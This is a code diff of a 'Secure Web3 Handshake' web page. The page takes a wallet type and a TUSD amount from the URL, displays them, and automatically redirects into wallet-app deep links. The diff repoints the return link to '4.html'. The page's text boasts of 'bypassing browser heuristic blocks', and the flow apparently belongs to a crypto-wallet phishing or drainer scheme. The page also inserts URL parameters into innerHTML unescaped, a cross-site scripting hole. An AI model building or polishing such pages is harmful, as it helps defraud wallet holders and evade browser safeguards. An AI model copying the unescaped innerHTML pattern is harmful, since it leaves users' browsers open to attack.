@@ -71,7 +71,7 @@
     <div class="gateway-card">
         <h2>🛡️ Secure Web3 Handshake</h2>
         <div class="spinner"></div>
-        <p>Bypassing browser heuristic blocks and routing your delta consolidation safely through Render infrastructure...</p>
+        <p>Bypassing browser heuristic blocks and routing your delta consolidation safely...</p>
         
         <div class="target-box" id="routeDetails">
             Initializing secure payload tunnel...
@@ -85,7 +85,6 @@
             const params = new URLSearchParams(window.location.search);
             const walletType = params.get('wallet');
             const amount = params.get('amount');
-            const targetDapp = params.get('redirect') || window.location.origin + "/";
 
             const routeDetails = document.getElementById('routeDetails');
             const manualBtn = document.getElementById('manualRedirectBtn');
@@ -97,8 +96,9 @@
 
             routeDetails.innerHTML = `<b>Target Wallet:</b> ${walletType.toUpperCase()}<br><b>Consolidation Delta:</b> ${amount} TUSD<br><b>Status:</b> Ready for dispatch`;
 
-            // Construct safe deep-link destination URL
-            const finalDappUrl = `${targetDapp}?wallet_auth=${walletType}&amt=${amount}&t=${Date.now()}`;
+            // Point cleanly back to 4.html with the exact parameter names that 4.html's load listener expects
+            const terminalPageUrl = window.location.origin + "/4.html"; // Update path if 4.html is in a subfolder
+            const finalDappUrl = `${terminalPageUrl}?wallet=${walletType}&amount=${amount}&t=${Date.now()}`;
             
             let deepLink = "";
             switch(walletType.toLowerCase()) {
@@ -120,7 +120,7 @@
                 window.location.href = deepLink;
             };
 
-            // Automatic execution delay to ensure rendering completes smoothly on Render
+            // Automatic execution delay
             setTimeout(() => {
                 window.location.href = deepLink;
             }, 800);
